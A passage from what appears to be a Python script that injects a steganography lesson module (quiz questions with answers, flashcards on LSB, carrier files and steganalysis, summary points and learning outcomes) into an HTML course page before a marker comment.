    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which of the following is a carrier file in steganography?', opts: ['The secret message to be hidden.', 'The tool used to hide the data.', 'The password used for encryption.', 'The innocent-looking file used to conceal the secret data.'], correct: 3, fb: 'The carrier file "carries" the hidden payload.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How does Steghide protect the hidden data?', opts: ['By changing the file extension.', 'By compressing it only.', 'By encrypting the data with a passphrase before embedding it.', 'By renaming the carrier file.'], correct: 2, fb: 'Steghide provides an option to encrypt the embedded data, adding a layer of cryptography to the steganography.' }
  ],
  flashcards: [
    { f: 'LSB (Least Significant Bit)', b: 'A steganography technique that alters the lowest-order bit in a byte to hide data without significantly changing the file.' },
    { f: 'Steganalysis', b: 'The science and art of detecting hidden information within files.' },
    { f: 'Carrier File', b: 'The normal, benign file (like an image or audio track) used to conceal a secret payload.' }
  ],
  summary: ['Steganography hides the existence of data.', 'LSB is a common technique used in images.', 'Tools like Steghide embed and extract data.', 'Used for covert communication and data exfiltration.', 'Steganalysis is required to detect hidden payloads.'],
  outcomes: ['Differentiate steganography from cryptography.', 'Perform data embedding using Steghide.', 'Understand LSB concepts.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Advanced", prerequisites: [], lastReviewed: "2026-07-18" }
};
"""

with open(html_path, 'r', encoding='utf-8') as f:
    content = f.read()

target = "// ── TAB WIRING ──"
if target in content:
    new_content = content.replace(target, payload + "\\n" + target)
    with open(html_path, 'w', encoding='utf-8') as f:
        f.write(new_content)
    print("Content successfully injected.")
else:
    print("Target comment not found.")
